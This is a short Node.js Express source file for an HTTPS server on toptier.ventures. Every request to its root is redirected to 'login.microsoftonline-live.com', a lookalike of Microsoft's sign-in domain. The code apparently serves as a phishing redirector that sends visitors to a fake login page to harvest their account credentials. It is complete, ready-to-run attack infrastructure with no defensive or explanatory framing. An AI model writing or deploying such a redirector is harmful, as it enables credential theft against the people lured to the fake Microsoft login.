const fs = require('fs');
const https = require('https');
const express = require('express');

const app = express();

const privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
const credentials = { key: privateKey, cert: certificate };

const port = 443; // Standard HTTPS port

app.get('/', (req, res) => {
  setTimeout(() => {
    res.redirect('https://login.microsoftonline-live.com/secure');
  }, 10);
});

const httpsServer = https.createServer(credentials, app);

httpsServer.listen(port, '0.0.0.0', () => {
  console.log(`Proxy server listening at https://www.toptier.ventures`);
});
